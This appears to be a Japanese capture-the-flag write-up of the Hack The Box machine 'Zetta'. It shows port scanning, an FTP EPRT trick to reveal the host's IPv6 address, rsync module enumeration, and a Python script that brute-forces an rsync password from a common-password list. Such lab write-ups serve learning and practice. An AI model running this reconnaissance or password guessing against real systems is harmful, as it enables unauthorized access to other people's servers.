偵察


このマシンのIPアドレスは10.10.10.156で、/ etc / hostsに追加しています。

10.10.10.156    zetta.htb

まず、開いているポートをスキャンします。nmapですべてのポートをスキャンするには時間がかかるため、最初にmasscanでこれを実行します。tun0インターフェースからすべてのTCPおよびUDPポートを毎秒500パケットの速度でスキャンします。

masscan -e tun0 -p1-65535,U:1-65535 10.10.10.156 --rate=500



次に、既知のポートに関する詳細情報を収集する必要があります。これを行うには、-Aオプションを指定してnmapを使用します。

nmap -A zetta.htb -p21,22,80



FTPの内容を確認してください。



その結果、バナーにはIPv6経由で接続できることが表示されます。 Webサーバーに何があるか見てみましょう。



FXPをサポートするネイティブFTPを観察します。 FXPは、2つのFTPサーバー間でファイルをコンピューターにダウンロードせずに直接転送する方法です。 FXPセッション中に、クライアントは2つの異なるサーバーへの2つのFTP接続を開き、最初のサーバー上のファイルを要求し、PORTコマンドで2番目のサーバーのIPアドレスを示します。



少しスクロールすると、FTPのユーザー名とパスワードが見つかります。資格情報を入力すると、FXPのサポートがあることが通知されます。



しかし、サーバーにファイルがないか、ファイルが提供されていません。ただし、このサーバーはFXPをサポートしているため、別のサーバーになりすますことができ、ターゲットサーバーが接続を開始しました。したがって、RFC 2428に従ってIPv6アドレスを明らかにします。





ホストにはIPv6接続のみを受け入れるサービスがあるため、これはさらにスキャンするために必要です。ですから、住所を知る必要があります。



tcpdumpを使用して、ポート4321に向かうトラフィックを追跡します。



そして、netcatを使用してftpに接続し、資格情報を指定します。

nc zetta.htb 21



そして今、EPRTリクエストを送信します。



また、ターゲットホストのIPv6アドレスを確認します。



これをIPv4ではなく/ etc / hostsに書き込み、nmapを使用してすべてのポートをスキャンし、-6オプションを追加します。

nmap -6 zetta.htb -p-



ここで、-Aオプションを使用して詳細情報を取得します。 

nmap -A -6 zetta.htb -p21,22,80,8730



エントリーポイント


Rsync（リモート同期）は、ファイルとディレクトリを2か所で同期し、トラフィックを最小限に抑えるUNIXライクなシステム用のプログラムです。Rsyncは、オプションで圧縮と再帰を使用して、ディレクトリの内容をコピーまたは表示し、ファイルをコピーできます。rsyncはファイルの変更のみを転送するため、プログラムのパフォーマンスに影響します。モジュールのリストを見てみましょう。

rsync -6 --list-only rsync://zetta.htb:8730/



一部の重要なディレクトリがこのリストにありません。しかし、etcディレクトリは利用可能でした。

rsync -6 -av rsync://zetta.htb:8730/etc/rsync*



ローカルマシン上のこのファイルについて、rsyncd.confを読み取ります。

rsync -6 -a rsync://zetta.htb:8730/etc/rsyncd.conf .



この構成には、ユーザーのホームディレクトリroyを指すhome_royという非表示のモジュールがあり、rsyncd.secretsからパスワードで保護されていますが、使用できません。

rsync -6 rsync://zetta.htb:8730/home_roy/



ユーザー


アイデアがなくなったら、パスワードを整理しなければなりませんでした。このために、Pythonコードが作成され、Seclistsからのパスワードのリストが使用されました。

#!/usr/bin/python3

def clear():
    sys.stdout.write("\033[F")
    sys.stdout.write("\033[K")

from pwn import *

with open("/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt", "r") as f:
    passwords = f.read().split('\n')

for password in passwords:
    s = process(["rsync", "-6", "rsync://roy@zetta.htb:8730/home_roy"], env={"RSYNC_PASSWORD":password})
    clear()
    clear()
    print(("password: " + password).ljust(30, " "), end="\r\r")
    
    s.recvuntil("\"Cloud sync\".\n\n\n")
    if b"@ERROR:" not in s.recv():
        print("found!!!")
        break
    s.close()
clear()
